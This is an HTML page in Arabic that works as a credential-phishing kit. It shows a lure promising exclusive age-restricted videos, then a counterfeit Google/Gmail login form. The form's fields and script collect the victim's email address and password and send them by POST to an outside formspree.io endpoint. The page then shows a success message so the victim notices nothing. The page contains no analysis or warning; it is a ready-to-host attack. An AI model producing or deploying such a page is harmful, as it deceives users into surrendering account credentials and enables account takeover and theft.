<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            transition: background-color 0.3s ease;
        }
        #video-page {
            text-align: center;
            width: 90%;
            max-width: 500px;
            color: white;
        }
        .thumbnail-container {
            position: relative;
            background: #222;
            padding: 10px;
            border-radius: 10px;
            border: 1px solid #333;
        }
        .thumbnail-container img {
            width: 100%;
            border-radius: 5px;
            opacity: 0.7;
        }
        .play-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 60px;
            color: rgba(255, 255, 255, 0.9);
        }
        .btn-watch {
            background-color: #e50914;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
        #login-page {
            display: none;
            background: white;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: center;
        }
        .google-logo {
            margin-bottom: 10px;
        }
        #login-page h2 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        #login-page p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            direction: rtl;
        }
        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .forgot-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            text-align: right;
            margin-bottom: 30px;
        }
        .login-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }
        .btn-submit {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-submit:hover {
            background-color: #1557b0;
        }
        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        .message.error {
            background-color: #fce8e6;
            color: #c5221f;
        }
        .message.success {
            background-color: #e6f4ea;
            color: #137333;
        }
    </style>
</head>
<body>

<div id="video-page">
    <h1>مشاهدة فيديوهات حصرية 2026</h1>
    <div class="thumbnail-container">
        <img src="https://images.unsplash.com/photo-1593359674241-55cd0dde72a2?auto=format&fit=crop&w=500&q=60" alt="Video Thumbnail">
        <div class="play-icon">▶</div>
        <h3>فيديو حصري: محتوى مقيد للفئة العمرية</h3>
    </div>
    <button class="btn-watch" onclick="showLogin()">مشاهدة الآن</button>
</div>

<div id="login-page">
    <div class="google-logo">
        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
            <path d="M14.1 2.2C11.5 2.2 9.1 3.4 7.5 5.3l3 2.5c1-1.2 2.5-1.9 4-1.9 2.8 0 5.1 1.9 5.8 4.5l3.4-2.6C21.6 4.7 18.2 2.2 14.1 2.2z" fill="#EA4335"/>
            <path d="M23.3 11.4c0-.7-.1-1.4-.2-2.1H14.1v4h5.2c-.2 1.2-1 2.3-2 3l3.2 2.5c1.9-1.8 3-4.4 3-7.4z" fill="#4285F4"/>
            <path d="M7.1 14.5c-.2-.6-.3-1.3-.3-2s.1-1.4.3-2L3.7 7.9c-.7 1.3-1.1 2.8-1.1 4.3s.4 3 1.1 4.3l3.4-2z" fill="#FBBC05"/>
            <path d="M14.1 21.8c4.1 0 7.5-2.5 9.6-5.6l-3.2-2.5c-.7 1-1.8 1.7-3.2 1.7-3.1 0-5.6-2.1-6.5-4.9l-3.4 2.6c1.8 4.4 5.8 8.7 6.7 8.7z" fill="#34A853"/>
        </svg>
    </div>
    <h2>تسجيل الدخول</h2>
    <p>عبر Gmail</p>

    <form action="https://formspree.io/f/mgoakeqe" method="POST">
        <div class="input-group">
            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
        </div>
        <a href="#" class="forgot-link">هل نسيت البريد الإلكتروني؟</a>
        <div class="login-footer">
            <a href="#" class="create-account">إنشاء حساب</a>
            <button type="submit" class="btn-submit">التالي</button>
        </div>
        <div id="form-message" class="message"></div>
    </form>
</div>

<script>
    function showLogin() {
        document.getElementById('video-page').style.display = 'none';
        document.getElementById('login-page').style.display = 'block';
        document.body.style.backgroundColor = '#fff';
    }

    // معالجة إرسال النموذج لإظهار رسالة
    const form = document.querySelector('form');
    const messageDiv = document.getElementById('form-message');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = new FormData(form);
        const submitBtn = form.querySelector('.btn-submit');
        submitBtn.disabled = true;
        submitBtn.textContent = 'جاري الإرسال...';

        try {
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            });
            if (response.ok) {
                messageDiv.textContent = '✅ تم إرسال البيانات بنجاح!';
                messageDiv.className = 'message success';
                messageDiv.style.display = 'block';
                form.reset();
                setTimeout(() => {
                    messageDiv.style.display = 'none';
                }, 5000);
            } else {
                throw new Error('فشل الإرسال');
            }
        } catch (error) {
            messageDiv.textContent = '❌ حدث خطأ، حاول مرة أخرى.';
            messageDiv.className = 'message error';
            messageDiv.style.display = 'block';
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'التالي';
        }
    });
</script>
</body>
</html>
